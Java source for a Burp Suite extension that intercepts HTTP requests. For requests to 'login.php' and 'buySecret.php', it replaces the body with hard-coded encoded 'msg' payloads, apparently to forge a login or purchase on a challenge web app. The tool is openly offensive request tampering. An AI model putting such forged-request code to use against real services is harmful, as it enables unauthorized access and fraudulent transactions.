package burp;

import java.io.PrintWriter;

public class BurpExtender implements IBurpExtender, IHttpListener
{
    private PrintWriter stdout;
    private IExtensionHelpers helpers;

    //
    // implement IBurpExtender and IHttpListener
    //

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        // obtain an extension helpers object
        helpers = callbacks.getHelpers();

        // set our extension name
        callbacks.setExtensionName("Your Extension's name");
        // print logs here
        stdout = new PrintWriter(callbacks.getStdout(), true);
        // register ourselves as an HTTP listener
        callbacks.registerHttpListener(this);
    }

    //
    // implement IHttpListener
    //

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)
    {
        // process request
        if (messageIsRequest) {
            stdout.println("Request");
            // get the HTTP service for the request
            IHttpService httpService = messageInfo.getHttpService();
            // print out the host
            stdout.println("host " + httpService.getHost() + ":" + httpService.getPort());
            // print out the request
            String req = new String(messageInfo.getRequest());
            String reqmatch = "Content-Length";
            int startIndex = req.indexOf(reqmatch);
            int stopIndex = req.length();
            if (req.contains("login.php") && startIndex != -1)
            {
                String replacement = "Content-Length:60\r\n\r\nmsg=OVZWK4TOMFWWKPKHKVCVGVBGOBQXG43XN5ZGIPKUIVGVAX2QIFJVGV2E";
                StringBuilder build = new StringBuilder(req);
                build.delete(startIndex,stopIndex);
                req = build.toString()  + replacement ;
            }
            if (req.contains("buySecret.php") && startIndex != -1)
            {
                String replacement = "Content-Length:72\r\n\r\nmsg=OVZWK4S7NFSD2MRQGMYDOMJTGAYDINBGNVXW4ZLZHU4TSOJZHE4SM2LTL5TGC23FHUYA";
                StringBuilder build = new StringBuilder(req);
                build.delete(startIndex,stopIndex);
                req = build.toString()  + replacement ;
            }
            stdout.println("request " + req);
            // you can modify the request like this
            messageInfo.setRequest(req.getBytes() );
        }


        // process response
        if (!messageIsRequest)
        {
            stdout.println("Response");
            // get the HTTP service for the request
            IHttpService httpService = messageInfo.getHttpService();
            // print out the host
            stdout.println("host " + httpService.getHost() + ":" + httpService.getPort() );
            // print out the response
            String resp = new String(messageInfo.getResponse() );
            stdout.println("response " + resp);
            // you can modify the request like this
            messageInfo.setResponse(resp.getBytes());
        }
    }

}